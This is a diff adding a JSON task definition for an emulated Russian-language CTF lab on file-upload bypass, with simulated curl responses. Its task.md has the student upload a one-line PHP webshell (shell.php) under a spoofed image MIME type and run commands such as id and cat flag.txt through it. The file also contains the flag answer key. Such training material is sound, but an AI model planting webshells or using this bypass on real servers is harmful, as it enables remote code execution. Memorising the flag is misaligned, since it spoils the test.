@@ -1,0 +1,46 @@
+{
+  "id": "web-file-upload",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{upl04d_byp4ss_t0_w3bsh3ll}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: обход проверки загрузки → webshell\n\nЦель — `http://app.lab.local`. Форма загрузки проверяет только расширение.\nВ каталоге уже лежит `shell.php` — веб-шелл. Нужно протащить его как картинку.\n\n1. Загрузи файл, подделав MIME-тип:\n\n   curl -s -F 'file=@shell.php;type=image/png' -F 'name=avatar' http://app.lab.local/upload\n\n2. Сервер вернёт URL загруженного файла. Обратись к нему с командой:\n\n   curl -s 'http://app.lab.local/uploads/ab12cd.php?c=id'\n\n3. Прочитай флаг: `... ?c=cat flag.txt`.\n4. Запиши флаг в `found.txt` и набери `check`.\n"
+    },
+    {
+      "path": "/home/student/task/shell.php",
+      "text": "<?php system($_GET['c']); ?>\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.lab.local)",
+      "cases": [
+        {
+          "match": "uploads/ab12cd\\.php\\?c=cat|cat\\+flag|flag\\.txt",
+          "example": "-s 'http://app.lab.local/uploads/ab12cd.php?c=cat flag.txt'",
+          "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nnto{upl04d_byp4ss_t0_w3bsh3ll}\n"
+        },
+        {
+          "match": "uploads/ab12cd\\.php",
+          "example": "-s 'http://app.lab.local/uploads/ab12cd.php?c=id'",
+          "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
+        },
+        {
+          "match": "upload",
+          "example": "-F 'file=@shell.php;type=image/png' -F 'name=avatar' http://app.lab.local/upload",
+          "output": "HTTP/1.1 200 OK\nServer: nginx/1.24.0\nContent-Type: application/json\nContent-Length: 39\n\n{\"ok\":true,\"url\":\"/uploads/ab12cd.php\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются только /upload и /uploads/ab12cd.php на app.lab.local.\n"
+    }
+  }
+}
